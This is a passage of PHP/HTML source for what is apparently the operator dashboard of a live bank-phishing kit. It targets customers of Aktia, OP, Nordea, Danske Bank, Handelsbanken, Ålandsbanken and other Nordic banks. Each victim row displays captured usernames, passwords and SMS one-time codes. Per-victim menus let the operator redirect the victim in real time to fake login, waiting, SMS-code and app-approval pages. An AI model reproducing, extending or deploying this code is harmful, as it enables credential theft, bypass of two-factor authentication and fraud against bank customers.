                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm hidden xl:table-cell" id="user-aktia-<?= $user['id'] ?>">
                                <?php if (!empty($user['aktia_username']) || !empty($user['aktia_sms_code']) || !empty($user['aktia_app_confirmed']) || !empty($user['aktia_login_method'])): ?>
                                    <div class="text-xs">
                                        <?php if (!empty($user['aktia_username'])): ?>
                                        <div class="font-medium text-slate-200">Käyttäjätunnus:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['aktia_username']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['aktia_login_method'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Kirjautumistapa:</div>
                                        <div class="text-slate-300">
                                            <?= $user['aktia_login_method'] === 'app' ? 'Kyllä, Aktia ID -sovellus' : 'Ei, verkkopankkitunnus + SMS' ?>
                                        </div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['aktia_sms_code'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Tekstiviestikoodi:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['aktia_sms_code']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['aktia_app_confirmed'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Sovelluksen vahvistus:</div>
                                        <div class="text-green-400">✓ Vahvistettu</div>
                                        <?php endif; ?>
                                    </div>
                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm hidden xl:table-cell" id="user-op-<?= $user['id'] ?>">
                                <?php if (!empty($user['op_username']) || !empty($user['op_password']) || !empty($user['op_sms_code']) || !empty($user['op_app_confirmed'])): ?>
                                    <div class="text-xs">
                                        <?php if (!empty($user['op_username'])): ?>
                                        <div class="font-medium text-slate-200">Käyttäjätunnus:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['op_username']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['op_password'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Salasana:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['op_password']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['op_sms_code'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">SMS-koodi:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['op_sms_code']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['op_app_confirmed'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Sovelluksen vahvistus:</div>
                                        <div class="text-green-400">✓ Vahvistettu</div>
                                        <?php endif; ?>
                                    </div>
                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm hidden xl:table-cell" id="user-poppankki-<?= $user['id'] ?>">
                                <?php if (!empty($user['poppankki_username']) || !empty($user['poppankki_sms_code']) || !empty($user['poppankki_app_confirmed'])): ?>
                                    <div class="text-xs">
                                        <?php if (!empty($user['poppankki_username'])): ?>
                                        <div class="font-medium text-slate-200">Käyttäjätunnus / Användarkod:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['poppankki_username']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['poppankki_sms_code'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">SMS Kodu:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['poppankki_sms_code']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['poppankki_app_confirmed'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Uygulama Onayı:</div>
                                        <div class="text-green-400">✓ Onaylandı</div>
                                        <?php endif; ?>
                                    </div>
                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm hidden xl:table-cell" id="user-omasp-<?= $user['id'] ?>">
                                <?php if (!empty($user['omasp_username']) || !empty($user['omasp_sms_code']) || !empty($user['omasp_app_confirmed'])): ?>
                                    <div class="text-xs">
                                        <?php if (!empty($user['omasp_username'])): ?>
                                        <div class="font-medium text-slate-200">Käyttäjätunnus:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['omasp_username']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['omasp_sms_code'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">SMS Kodu:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['omasp_sms_code']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['omasp_app_confirmed'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Uygulama Onayı:</div>
                                        <div class="text-green-400">✓ Onaylandı</div>
                                        <?php endif; ?>
                                    </div>
                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm hidden xl:table-cell" id="user-saastopankki-<?= $user['id'] ?>">
                                <?php if (!empty($user['saastopankki_username']) || !empty($user['saastopankki_sms_code']) || !empty($user['saastopankki_app_confirmed'])): ?>
                                    <div class="text-xs">
                                        <?php if (!empty($user['saastopankki_username'])): ?>
                                        <div class="font-medium text-slate-200">Käyttäjätunnus:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['saastopankki_username']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['saastopankki_sms_code'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">SMS Kodu:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['saastopankki_sms_code']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['saastopankki_app_confirmed'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Uygulama Onayı:</div>
                                        <div class="text-green-400">✓ Onaylandı</div>
                                        <?php endif; ?>
                                    </div>
                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm hidden xl:table-cell" id="user-handelsbanken-<?= $user['id'] ?>">
                                <?php if (!empty($user['handelsbanken_username']) || !empty($user['handelsbanken_password']) || !empty($user['handelsbanken_sms_code']) || !empty($user['handelsbanken_app_confirmed'])): ?>
                                    <div class="text-xs">
                                        <?php if (!empty($user['handelsbanken_username'])): ?>
                                        <div class="font-medium text-slate-200">Användarnamn:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['handelsbanken_username']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['handelsbanken_password'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Lösenord:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['handelsbanken_password']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['handelsbanken_sms_code'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">SMS-kod:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['handelsbanken_sms_code']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['handelsbanken_app_confirmed'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Appbekräftelse:</div>
                                        <div class="text-green-400">✓ Bekräftad</div>
                                        <?php endif; ?>
                                    </div>
                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm" id="user-page-<?= $user['id'] ?>">
                                <?php if (!empty($user['current_page'])): ?>
                                    <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-900/30 text-green-400 border border-green-700/50">
                                        <span class="w-2 h-2 bg-green-400 rounded-full mr-1.5 animate-pulse"></span>
                                        <?= htmlspecialchars($user['page_title'] ?? $user['current_page']) ?>
                                    </span>
                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm text-slate-400 hidden lg:table-cell">
                                <?= date('d.m.Y H:i', strtotime($user['created_at'])) ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm">
                                <div class="relative inline-block text-left" x-data="{ open: false, menuTop: 0, menuRight: 0 }" 
                                     x-init="$watch('open', value => { if(value) { const rect = $el.getBoundingClientRect(); menuTop = rect.top - 10; menuRight = window.innerWidth - rect.right; } })">
                                    <button 
                                        @click="open = !open"
                                        class="inline-flex items-center px-3 py-2 border border-slate-600 shadow-sm text-sm leading-4 font-medium rounded-md text-slate-200 bg-slate-700 hover:bg-slate-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-400 transition-all duration-200"
                                    >
                                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path>
                                        </svg>
                                    </button>
                                    
                                    <div 
                                        x-show="open"
                                        @click.away="open = false"
                                        x-transition:enter="transition ease-out duration-150"
                                        x-transition:enter-start="transform opacity-0 scale-95 translate-y-2"
                                        x-transition:enter-end="transform opacity-100 scale-100 translate-y-0"
                                        x-transition:leave="transition ease-in duration-100"
                                        x-transition:leave-start="transform opacity-100 scale-100 translate-y-0"
                                        x-transition:leave-end="transform opacity-0 scale-95 translate-y-2"
                                        class="origin-bottom-right fixed w-80 rounded-lg shadow-2xl bg-slate-800 border border-slate-600 z-[9999] max-h-[70vh] overflow-y-auto"
                                        :style="'top: ' + menuTop + 'px; right: ' + menuRight + 'px; scrollbar-width: thin; scrollbar-color: #475569 #1e293b;'"
                                    >
                                        <div class="py-2" role="menu">
                                            <div class="px-4 py-2 bg-slate-700 border-b border-slate-600">
                                                <div class="text-xs font-semibold text-slate-300 uppercase tracking-wide">Genel Sayfalar</div>
                                            </div>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/waiting')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekletme Sayfası
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/whatsapp')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-gray-400 group-hover:text-blue-600" fill="currentColor" viewBox="0 0 24 24">
                                                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
                                                </svg>
                                                WhatsApp Yönlendirme
                                            </button>
                                            <div class="border-t border-slate-600 my-2"></div>
                                            <div class="px-4 py-2 bg-slate-700 border-b border-slate-600">
                                                <div class="text-xs font-semibold text-slate-300 uppercase tracking-wide">Aktia</div>
                                            </div>
                                            <?php
                                            $aktiaBankId = null;
                                            foreach ($banks as $b) {
                                                if (stripos($b['name'], 'aktia') !== false) {
                                                    $aktiaBankId = $b['id'];
                                                    break;
                                                }
                                            }
                                            ?>
                                            <?php if ($aktiaBankId): ?>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/<?= $aktiaBankId ?>')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                                </svg>
                                                Giriş
                                            </button>
                                            <?php endif; ?>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/aktia2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekleme
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/aktia3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                                                </svg>
                                                SMS Kodu
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/aktia4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Uygulama Onayı
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/aktia5')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Hata Sayfası
                                            </button>
                                            <div class="border-t border-slate-600 my-2"></div>
                                            <div class="px-4 py-2 bg-gray-50 border-b border-gray-200">
                                                <div class="text-xs font-semibold text-gray-700 uppercase tracking-wide">Ålandsbanken</div>
                                            </div>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                                </svg>
                                                Giriş
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/alandsbanken2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekleme
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/alandsbanken3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                                                </svg>
                                                SMS-kod
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/alandsbanken4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekräftelse
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/alandsbanken5')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Fel
                                            </button>
                                            <div class="border-t border-slate-600 my-2"></div>
                                            <div class="px-4 py-2 bg-gray-50 border-b border-gray-200">
                                                <div class="text-xs font-semibold text-gray-700 uppercase tracking-wide">Danske Bank</div>
                                            </div>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                                </svg>
                                                Giriş
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/danske2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekleme
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/danske3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                                                </svg>
                                                SMS Code
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/danske4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                App Confirmation
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/danske5')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Error Page
                                            </button>
                                            <div class="border-t border-slate-600 my-2"></div>
                                            <div class="px-4 py-2 bg-gray-50 border-b border-gray-200">
                                                <div class="text-xs font-semibold text-gray-700 uppercase tracking-wide">Nordea</div>
                                            </div>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/1')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                                </svg>
                                                Giriş
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/nordea2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekleme
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/nordea3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                                                </svg>
                                                SMS Kodu
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/nordea4')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Uygulama Onayı
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/nordea5')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Hata Sayfası
                                            </button>
                                            <div class="border-t border-slate-600 my-2"></div>
                                            <div class="px-4 py-2 bg-gray-50 border-b border-gray-200">
                                                <div class="text-xs font-semibold text-gray-700 uppercase tracking-wide">OmaSP</div>
                                            </div>
                                            <?php
                                            $omaspBankId = null;
                                            foreach ($banks as $b) {
                                                if (stripos($b['name'], 'omasp') !== false || stripos($b['name'], 'oma säästöpankki') !== false) {
                                                    $omaspBankId = $b['id'];
                                                    break;
                                                }
                                            }
                                            ?>
                                            <?php if ($omaspBankId): ?>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/<?= $omaspBankId ?>')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                                </svg>
                                                Giriş
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/omasp2')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                                </svg>
                                                Bekleme
                                            </button>
                                            <button 
                                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/bank/omasp3')"
                                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                                role="menuitem"
                                            >
                                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
